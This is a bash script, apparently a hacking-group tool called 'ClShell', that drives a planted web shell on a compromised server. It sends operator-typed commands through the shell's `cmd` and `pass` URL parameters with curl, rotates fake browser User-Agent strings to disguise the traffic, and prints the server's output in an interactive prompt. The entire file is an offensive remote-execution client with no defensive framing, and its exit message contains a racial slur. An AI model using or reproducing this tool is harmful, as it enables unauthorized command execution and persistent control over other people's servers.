SHELL_URL=""
PASSWORD=""

BLUE="\033[34;1m"
RED="\033[31;1m"
GREEN="\033[32;1m"
WHITE="\033[37;1m"
RESET="\033[0m"

echo -e "${RED}"

echo -e " ${BLUE}
                  ________       _____ __  __________    __
                 / ____/ /      / ___// / / / ____/ /   / /
                / /   / /       \__ \/ /_/ / __/ / /   / /
               / /___/ /___    ___/ / __  / /___/ /___/ /___
               \____/_____/   /____/_/ /_/_____/_____/_____/
                             ${RED}
                        Coded By Kirov Elite Group
                https://github.com/FreeromSec1337/ClShell

            ===================================================
${RESET}"

USER_AGENTS=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15"
"Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/117.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15"
)

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            SHELL_URL="$2"
            shift 2
            ;;
        --pass)
            PASSWORD="$2"
            shift 2
            ;;
        *)
            echo "Unknown option $1"
            exit 1
            ;;
    esac
done

if [[ -z "$SHELL_URL" || -z "$PASSWORD" ]]; then
    echo "Usage: $0 -u <shell_url> --pass <password>"
    exit 1
fi

DOMAIN=$(echo $SHELL_URL | awk -F[/:] '{print $4}')

USER=$(curl -s "${SHELL_URL}?cmd=whoami&pass=$PASSWORD" \
-H "User-Agent: ${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "Accept-Language: en-US,en;q=0.5" \
-H "Connection: keep-alive")
if [[ -z "$USER" ]]; then
    USER="unknown"
fi

while true; do
    echo -ne "${BLUE}${USER}${WHITE}@${RED}${DOMAIN}${WHITE} > ${GREEN}"
    read CMD
    echo -ne "${RESET}"

    if [[ "$CMD" == "exit" ]]; then
        echo -e "${WHITE}[OK] nigga${RESET}"
        break
    fi

    UA="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"

    RESPONSE=$(curl -s "${SHELL_URL}?cmd=$(echo $CMD | sed 's/ /%20/g')&pass=$PASSWORD" \
        -H "User-Agent: $UA" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Connection: keep-alive")

    echo -e "${GREEN}$RESPONSE${RESET}"
done
